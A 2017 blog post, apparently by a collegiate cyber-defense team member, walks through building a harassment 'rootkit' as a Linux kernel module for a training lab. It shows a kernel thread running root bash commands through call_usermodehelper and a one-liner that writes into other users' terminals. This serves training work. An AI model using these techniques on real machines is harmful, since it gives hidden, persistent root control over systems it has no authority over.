---
layout: post
title:  "GLaDOS the Kernel Mode Rootkit"
date:   2017-10-21 8:00:00 -0500
categories: exploits misc
---
Our CCDC team decided to throw together a "find and remove the virus" lab for
all the new recruits to get used to rooting out the red team's persistence
mechanisms. Each of the old team members threw together a small virus to infect
a VM for the lab attendees to track down. I decided I wanted to make something
super stealthy which would require a lot of linux knowledge to defeat - enter
GLaDOS the malevolent linux kernel module.

![glados-kernel-module]({{ site.baseurl }}/img/glados-kernel-module/glados_kernel.png)

As the next year of CCDC rolls around I've taken a much lesser role in the
team than previous years, primarily because I'm graduating in December and
won't be able to participate this year. This left me with some free time to
really come up with something interesting for this week's lab. I decided to go
super stealthy and write my own kernel module for them to deal with. And what
better theme for a malevolent, unkillable computer program that wants to
destroy you than [portal's GLaDOS](http://half-life.wikia.com/wiki/GLaDOS)
(that I should even have to link to the wiki is a shame but half of the CCDC
recruits had never played portal).

## Writing a Linux Kernel Module

For those of you less familiar with the basics of computer architecture, here's
an architecture diagram. This diagram is actually pretty generic and applicable
to Windows as well as Linux with the exception of glibc addition between user
applications and the kernel.

<!-- https://www.ibm.com/developerworks/library/l-linux-kernel/figure2.jpg -->
![architecture]({{ site.baseurl }}/img/glados-kernel-module/architecture.jpg)

On a typical computer, the kernel is the lowest level of code running - think
of it as the heart of your operating system. As such, it controls access
hardware resources, manages processes running on the system, allocates and
frees memory, and generally acts as an arbiter between applications and the
physical hardware. The kernel is said to be running in 'kernel mode', as
opposed to the less privileged 'user mode' in which all of the other
applications run. Within user mode there are usually additional privilege
levels (on Linux, think 'root' vs a standard user) and user mode applications
are forbidden from accessing hardware resources directly. Instead, the kernel
exposes an api of system calls (syscalls) that user mode processes may call to
access hardware resources.

Sometimes, however, you need to write code that has direct access to hardware
resources and the kernel apis are not sufficient (an example is a driver for a
particular piece of hardware). To accommodate for this, the kernel allows you to
install custom kernel modules that run with kernel level privileges. While this
is useful for writing low level code to interface with hardware devices, it's
also useful for writing stealthy malware that user mode processes are helpless
to stop.

Here's some boilerplate kernel module code:

{% highlight c %}
// GLaDOS.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int __init GLaDOS_init(void) {
    // initialize the module - this is called when the module is insmoded

    #ifdef DEBUG
    printk("[GLaDOS][+] installed\n");
    #endif
    
    return 0;
}

static void __exit GLaDOS_exit(void) {
    // remove the module - this is called when the module is rmmoded

    #ifdef DEBUG
    printk("[GLaDOS][+] uninstalled\n");
    #endif

    return;
}

// declare the init and exit functions
module_init(GLaDOS_init);
module_exit(GLaDOS_exit);

// include additional metadata for modinfo
#define DRIVER_AUTHOR "GLaDOS"
#define DRIVER_DESC "This is your fault. It didn't have to be like this."

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");
{% endhighlight %}

And a Makefile:

{% highlight bash %}
# Makefile
obj-m += GLaDOS.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
{% endhighlight %}

This relatively straightforward kernel module just prints to the kernel log in
`/var/log/kern.log` using `printk` on install and removal. Now, to add some
periodic functionality we'll need to either write a function to hook an
interrupt or, somewhat simpler, start a kernel thread. We'll start with
something relatively simple:

{% highlight c %}
int stop = 0;

int GLaDOS_thread(void *data) {
    while(true) {
        #ifdef DEBUG
        printk("[GLaDOS][+] cake\n");
        #endif

        msleep_interruptible(INTERVAL_SECONDS * 1000);

        if(stop) return 0;
    }
}
{% endhighlight %}

And now in our init function, we can start the thread with:

{% highlight c %}
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>

struct task_struct *task;

static int __init GLaDOS_init(void) {
    // initialize the module - this is called when the module is insmoded

    task = kthread_run(&GLaDOS_thread, NULL, "GLaDOS");

    #ifdef DEBUG
    printk("[GLaDOS][+] installed\n");
    #endif
    
    return 0;
}
{% endhighlight %}

We're not passing in any data here but, if we wanted to, we could pass a global
pointer to the kernel thread via the second argument of `kthread_run`. This
kernel thread just prints 'cake' to the kernel log every `INTERVAL_SECONDS`
seconds.

So now we've got a basic kernel module written that spawns a kernel thread
which simply loops forever.  Unfortunately, writing interesting effects to
harass users of the system is hard from within the kernel - I would have to do
it in C without access to user mode api functions. Instead, I'd rather just
establish persistence with a kernel module and run all my effects in user mode.
Luckily, the linux kernel has has a helper function for this.

## call_usermodehelper()

Here's the prototype (from the linux kernel source):

{% highlight c %}
extern int call_usermodehelper(char *path, char **argv, char **envp, int wait);
{% endhighlight %}

Note that it actually looks pretty similar to the user mode api `execvpe`:

{% highlight c %}
int execvpe(const char *file, char *const argv[], char *const envp[]);
{% endhighlight %}

We've got a path to an executable to call, the `argv` array of strings, and an
environment array of strings `envp`. In user mode, `execvpe` causes the calling
process to begin executing the binary pointed to by `file` with arguments
provided by `argv` and environment variables in `envp`. Similarly, the kernel
mode function `call_usermodehelper` spawns a new user mode process executing
the binary pointed to by `path`, with arguments `argv`, and environment `envp`.
`call_usermodehelper` additionally includes a `wait` parameter, which controls
the blocking behavior of the function. There are three options for the wait
parameter which can be used as needed:

1. `UHM_WAIT_PROC` block until the process exits - this isn't usually
recommended from a kernel context

2. `UHM_WAIT_EXEC` block until the process has begun

3. `UHM_NO_WAIT` don't block at all - useful when `call_usermodehelper` is
called, for example, from an interrupt where execution must be returned to the
kernel as fast as possible.

So this gives us a way to spawn user mode processes from our kernel module for
any user on the system (specified in `envp`). To make my job even easier, I
just chose to spawn bash with the commands I want to run following the `-c`
flag. All together, we have:

{% highlight bash %}
static char *envp[] = {
    "SHELL=/bin/bash",
    "HOME=/root",
    "USER=root",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
    "DISPLAY=:0",
    "PWD=/root",
    NULL
};

char *argv[] = { "/bin/bash", "-c", CMD, NULL };

call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
{% endhighlight %}

Note: we used `UHM_WAIT_EXEC` here so this should only be called in a context
where blocking is acceptable - for example on a kernel thread. Calling this in
an interrupt context will probably cause the kernel to hang.

## Pestering Users

So we've got a way to run bash commands as root from within a kernel module.
Next, I had to figure out how I wanted to bug the new CCDC recruits so they
knew my virus was there. Writing messages to their terminals periodically
seemed like an obvious indication of compromise so from a root bash shell I
needed to find a way to write to the `stdout` of another process. Luckily,
linux maps file descriptors to the `/proc/` filesystem. For those of you
unfamiliar with `/proc/`, linux maps a bunch of useful process resources to the
filesystem under this directory. Under `/proc/<pid>/` for a given process
you'll find memory maps, mapped files, mounts, and (most useful to us) file
descriptors under `/proc/<pid>/fd`. As is the linux custom, file descriptor 0
corresponds to `stdin` for the process and is mapped to `/proc/<pid>/fd/0`.
This means we can write to `stdin` for any process by simply writing to this
file on the filesystem. Using `pgrep` and a little bit of `xargs` I came up
with the following command:

{% highlight bash %}
pgrep -f 'bash|fish|zsh' \
    | xargs printf '/proc/\%d/fd/0\n' \
    | xargs -I file bash -c 'echo cake > file'
{% endhighlight %}

This command uses `pgrep` to get the pids of any bash, fish, or zsh process on
the system, formats them as `/proc/<pid>/fd/0`, then prints 'cake' to each one.

In my virus I used this to send periodic GLaDOS quotes to running terminals on
the system from kernel mode. When I ran out of quotes, I [wrote the portal
song](https://github.com/ainterr/GLaDOS/tree/master/song) to every terminal and
then shut down the system.

The full source code for this project is available below and is intended for
**educational purposes only** - use at your own risk.

<center>
<div class="github-card" data-github="ainterr/GLaDOS" data-width="400" data-height="150" data-theme="medium"></div> 
<script src="//cdn.jsdelivr.net/github-cards/latest/widget.js"></script>
</center>
